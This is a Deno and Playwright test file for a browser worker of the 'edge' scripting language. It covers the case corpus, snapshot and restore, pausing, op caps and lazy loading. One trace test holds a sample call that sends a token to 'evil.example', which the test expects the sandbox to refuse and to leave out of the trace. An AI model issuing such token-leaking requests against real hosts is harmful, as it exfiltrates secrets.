// deno-lint-ignore no-import-prefix
import { chromium } from "npm:playwright@latest";
import { readFileSync } from "node:fs";
import { Buffer } from "node:buffer";

// One CDN host serves every family under a path prefix (/std, /js).
const CDN_HOST = "cdn.edgelang.dev";
// The staged CDN this run tests, served on loopback from cdn/ in CI and locally alike.
const BASE = Deno.env.get("EDGE_CDN_BASE")?.replace(/\/$/, "");
if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
// The registry the lock is read from, the real one unless a run moves it.
const SITE = (Deno.env.get("EDGE_SITE_BASE") ?? "https://edgelang.dev").replace(/\/$/, "");

const REPO = new URL("../../", import.meta.url).pathname; // the repo root
const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
const PKG = JSON.parse(readFileSync(new URL("./app/edge.json", import.meta.url)));
// Negative fixtures, only their own cases import them, abi2 and ui fail to load by design.
const FIXTURES = new Set(["trap", "abi2", "ui"]);
// star-import every module the app carries, packages are imported by the cases that use them
const star = (imports) => Object.entries(imports).flatMap(([k, v]) => (FIXTURES.has(k) || !String(v).startsWith("./") ? [] : `from ${k} import *`));
const PRELUDE = star(PKG.imports).join("\n") + "\n";
const TYPES = {
    ".js": "text/javascript", ".wasm": "application/wasm", ".html": "text/html",
    ".mini": "text/plain", ".json": "application/json",
};

/* The official origin answers from BASE, decoded bytes and the CDN's own headers, CORS included. */
async function cdn(route, url) {
    // A staged CDN carries only this build, registry packages stay on the real one.
    const from = url.pathname.startsWith("/pkg/") ? url.origin : BASE;
    const res = await fetch(from + url.pathname + url.search);
    const headers = Object.fromEntries([...res.headers].filter(([k]) => k !== "content-encoding" && k !== "content-length"));
    return route.fulfill({ status: res.status, headers, body: Buffer.from(await res.arrayBuffer()) });
}

// The release in production still answers at the old address, so the second entry goes once it ships the rename.
const RESOLVERS = ["/api/resolve/package", "/api/packages"];

/* What `edge lock` would write beside app/edge.json, asked with lock=1 so nothing counts. */
async function lockOf(imports) {
    const lock = {};
    for (const [name, version] of Object.entries(imports)) {
        if (!/^\d+\.\d+\.\d+$/.test(version)) continue;
        let res;
        for (const at of RESOLVERS) {
            res = await fetch(`${SITE}${at}/${name}?v=${version}&lock=1`);
            if (res.ok) break;
        }
        if (!res.ok) throw new Error(`the registry has no ${name} ${version}, it answered ${res.status}`);
        const { url, digest } = await res.json();
        lock[name] = { version, url, digest: `sha256-${digest}` };
    }
    return lock;
}

/* a minimal plugin module built by hand whose `boom` traps and `__edge_abi_version` reports `abi` */
function pdkModule(abi) {
    const enc = new TextEncoder();
    const leb = (n) => { const out = []; do { let b = n & 0x7f; n >>>= 7; if (n !== 0) b |= 0x80; out.push(b); } while (n !== 0); return out; };
    const vec = (items) => [...leb(items.length), ...items.flat()];
    const name = (s) => vec([...enc.encode(s)].map((b) => [b]));
    const section = (id, body) => [id, ...leb(body.length), ...body];
    const body = (code) => { const b = [0x00, ...code, 0x0b]; return [...leb(b.length), ...b]; };
    const types = section(1, vec([[0x60, 0x00, 0x01, 0x7f], [0x60, 0x01, 0x7f, 0x01, 0x7f], [0x60, 0x03, 0x7f, 0x7f, 0x7f, 0x01, 0x7f]]));
    const funcs = section(3, vec([[0], [1], [2]]));
    const memory = section(5, vec([[0x00, 0x01]]));
    const exports = section(7, vec([
        [...name("memory"), 0x02, 0x00],
        [...name("__edge_abi_version"), 0x00, 0x00],
        [...name("__edge_alloc"), 0x00, 0x01],
        [...name("boom"), 0x00, 0x02],
    ]));
    const code = section(10, vec([body([0x41, ...leb(abi)]), body([0x41, 0x00]), body([0x00])]));
    // Buffer, not Uint8Array, route.fulfill never delivers a plain typed array body.
    return Buffer.from([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, ...types, ...funcs, ...memory, ...exports, ...code]);
}

/* Boots one worker through createWorker on index.html, then feeds every js.json case to it, comparing what it printed for output cases and the run trace for error cases. */
Deno.test("js: createWorker runs the corpus in a page", async () => {
    const browser = await chromium.launch();
    const page = await browser.newPage();
    const errors = [];
    page.on("pageerror", (e) => errors.push(e.message));
    page.on("console", (m) => { if (m.type() === "error") errors.push(m.text()); });
    const requested = [];
    page.on("request", (q) => requested.push(q.url()));
    const lock = JSON.stringify(await lockOf(PKG.imports));

    const strays = new Set(); // requests to any host but the CDN and the page fixtures, each fails the test
    await page.route("**/*", (r) => {
        const u = new URL(r.request().url());
        if (u.host === CDN_HOST) return cdn(r, u);
        if (u.host !== "localhost") {
            strays.add(`unexpected request to ${u.href}`);
            return r.abort();
        }
        if (u.pathname.endsWith("/app/trap.wasm")) return r.fulfill({ contentType: "application/wasm", body: pdkModule(1) });
        if (u.pathname.endsWith("/app/abi2.wasm")) return r.fulfill({ contentType: "application/wasm", body: pdkModule(2) });
        if (u.pathname.endsWith("/app/edge.lock")) return r.fulfill({ contentType: "application/json", body: lock });
        const ext = u.pathname.slice(u.pathname.lastIndexOf("."));
        try { return r.fulfill({ contentType: TYPES[ext] ?? "application/octet-stream", body: readFileSync(REPO + u.pathname.slice(1)) }); }
        catch { return r.fulfill({ status: 404 }); }
    });
    // A mock WebSocket echo server so network cases can open, echo and close sockets without leaving the page.
    await page.routeWebSocket("wss://localhost/echo", (ws) => {
        ws.onMessage((m) => ws.send(m));
    });
    await page.goto("http://localhost/js/tests/index.html");

    try {
        // One worker runs every case, and the page reads app/edge.json and the app's files for it.
        await page.evaluate(async (host) => {
            const { createWorker } = await import(host);
            globalThis.worker = await createWorker({ baseUrl: new URL("./app/", location.href).href });
        }, `https://${CDN_HOST}/js/src/index.js`);

        const reqd = (frag) => requested.some((u) => u.includes(frag));

        for (const c of cases) {
            errors.length = 0;
            const got = await page.evaluate(async (src) => {
                const lines = [];
                globalThis.worker.onOutput((t) => lines.push(t));
                // A module that fails to load rejects run(), surface it as out for error cases.
                try {
                    const { out } = await globalThis.worker.run(src);
                    return { printed: lines.join("").trim(), out };
                } catch (e) {
                    return { printed: lines.join("").trim(), out: String((e && e.message) || e) };
                }
            }, PRELUDE + c.script);

            if (c.error) {
                if (!got.out.includes(c.error)) {
                    throw new Error(`script:\n${c.script}\n  want error containing: ${JSON.stringify(c.error)}\n  got out: ${JSON.stringify(got.out)}\n  errors: ${errors.join(" | ") || "(none)"}`);
                }
            } else if (got.printed !== c.expect) {
                throw new Error(`script:\n${c.script}\n  got:  ${JSON.stringify(got.printed)}\n  want: ${JSON.stringify(c.expect)}\n  out: ${JSON.stringify(got.out)}\n  errors: ${errors.join(" | ") || "(none)"}`);
            }
        }

        // Park on receive(), save, finish, restore, steer differently.
        const snap = await page.evaluate(async () => {
            const worker = globalThis.worker;
            const chunks = [];
            worker.onOutput((c) => chunks.push(c));
            const src = "history = []\nwhile true:\n    m = receive()\n    if m == 'stop':\n        break\n    history.append(m)\nprint('|'.join(history))";
            const running = worker.run(src);
            const parked = async () => {
                for (let i = 0; i < 100; i++) {
                    if (JSON.stringify(await worker.stateStack()).includes("waiting_event")) return;
                    await new Promise((r) => setTimeout(r, 20));
                }
                throw new Error("run never parked on receive()");
            };
            await parked();
            worker.pushEvent("a");
            await parked();
            const blob = await worker.saveState();
            const globalsAtSave = await worker.stateGlobals();
            worker.pushEvent("b");
            worker.pushEvent("stop");
            await running;
            const first = chunks.join("");
            chunks.length = 0;
            const resumed = worker.restoreState(blob);
            worker.pushEvent("c");
            worker.pushEvent("d");
            worker.pushEvent("stop");
            await resumed;
            return { first, second: chunks.join(""), globalsAtSave, blobLen: blob.length };
        });
        if (snap.first !== "a|b\n") throw new Error(`snapshot: original run produced ${JSON.stringify(snap.first)}`);
        if (snap.second !== "a|c|d\n") throw new Error(`snapshot: restored run produced ${JSON.stringify(snap.second)}`);
        if (snap.globalsAtSave.history !== "['a']") throw new Error(`snapshot: stateGlobals saw ${JSON.stringify(snap.globalsAtSave)}`);
        if (!(snap.blobLen > 100)) throw new Error(`snapshot: implausible blob length ${snap.blobLen}`);

        // A suspension-free program still pauses and snapshots.
        const pre = await page.evaluate(async () => {
            const worker = globalThis.worker;
            const chunks = [];
            worker.onOutput((c) => chunks.push(c));
            await worker.setPreemptInterval(50000);
            const src = "n = 0\nwhile n < 1000000:\n    n = n + 1\nprint('done', n)";
            const running = worker.run(src);
            await worker.pause();
            const globalsAtPause = await worker.stateGlobals();
            const blob = await worker.saveState();
            worker.resume();
            await running;
            const first = chunks.join("");
            chunks.length = 0;
            await worker.restoreState(blob);
            await worker.setPreemptInterval(0);
            return { first, second: chunks.join(""), globalsAtPause, blobLen: blob.length };
        });
        if (pre.first !== "done 1000000\n") throw new Error(`preempt: original run produced ${JSON.stringify(pre.first)}`);
        if (pre.second !== "done 1000000\n") throw new Error(`preempt: restored run produced ${JSON.stringify(pre.second)}`);
        const pausedAt = Number(pre.globalsAtPause.n);
        if (!(pausedAt > 0 && pausedAt < 1000000)) throw new Error(`preempt: expected a mid-loop pause, n was ${JSON.stringify(pre.globalsAtPause.n)}`);
        if (!(pre.blobLen > 100)) throw new Error(`preempt: implausible blob length ${pre.blobLen}`);

        // A pause on an event yield holds the program until resume().
        const evPause = await page.evaluate(async () => {
            const worker = globalThis.worker;
            const chunks = [];
            worker.onOutput((c) => chunks.push(c));
            const running = worker.run("m = receive()\nn = receive()\nprint(m, n)");
            let sawPark = false;
            for (let i = 0; i < 100; i++) {
                if (JSON.stringify(await worker.stateStack()).includes("waiting_event")) { sawPark = true; break; }
                await new Promise((r) => setTimeout(r, 20));
            }
            if (!sawPark) throw new Error("run never parked on receive()");
            const parked = worker.pause();
            worker.pushEvent("a");
            if (!await parked) throw new Error("pause() did not park an event-parked run");
            worker.pushEvent("b");
            await new Promise((r) => setTimeout(r, 200));
            const held = chunks.join("");
            worker.resume();
            await running;
            return { held, out: chunks.join("") };
        });
        if (evPause.held !== "") throw new Error(`pause: event-parked run kept running after pause(), saw ${JSON.stringify(evPause.held)}`);
        if (evPause.out !== "a b\n") throw new Error(`pause: after resume expected 'a b\\n', got ${JSON.stringify(evPause.out)}`);

        // A cap the embedder declares reaches the engine, the sandbox default finishes this loop.
        const capped = await page.evaluate(async (host) => {
            const { createWorker } = await import(host);
            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", limits: { ops: 1000 } });
            const { out } = await worker.run("n = 0\nfor i in range(100000):\n    n = n + 1\nprint(n)");
            worker.dispose();
            return out;
        }, `https://${CDN_HOST}/js/src/index.js`);
        if (!capped.includes("budget exceeded")) throw new Error(`declared op cap: expected a budget error, got ${JSON.stringify(capped)}`);

        // a traced run reports what it reached and a url without its query
        const trace = await page.evaluate(async (host) => {
            const { createWorker } = await import(host);
            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", trace: true, permissions: { main: ["net"] } });
            const events = [];
            worker.onTrace((event) => events.push(event));
            await worker.run("import net\nprint('read it')\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456', {}, nil)\nexcept PermissionError as e:\n    pass\n");
            worker.dispose();
            return events;
        }, `https://${CDN_HOST}/js/src/index.js`);
        const said = JSON.stringify(trace);
        const call = (name) => trace.find((event) => event.kind === "call" && event.call === name);
        if (call("net.request")?.scope !== "GET evil.example/x" || call("net.request")?.outcome !== "denied") throw new Error(`trace: no refused request in ${said}`);
        if (!trace.some((event) => event.kind === "print" && event.text.includes("read it"))) throw new Error(`trace: no print in ${said}`);
        if (said.includes("t-456")) throw new Error(`trace: a query leaked into ${said}`);
        if (!trace.every((event) => event.at >= 0)) throw new Error(`trace: an event before the run began in ${said}`);
        if (trace[0]?.kind !== "run" || !(trace[0].epoch > 0)) throw new Error(`trace: no run start leads ${said}`);

        // Laziness, only what the corpus imports gets fetched, and a JavaScript import is refused before any fetch.
        if (reqd("/app/ui.js")) throw new Error("ui is JavaScript, yet ui.js was fetched");
        if (!reqd("/pkg/json/")) throw new Error("json imported but its package was never fetched");
        if (reqd("/pkg/re/")) throw new Error("re declared but never imported, yet its package was fetched (not lazy)");

        if (strays.size) throw new Error([...strays].join("\n"));
    } catch (e) {
        // A stray request explains any failure it caused, report it first.
        throw strays.size ? new Error([...strays].join("\n"), { cause: e }) : e;
    } finally {
        await browser.close();
    }
});

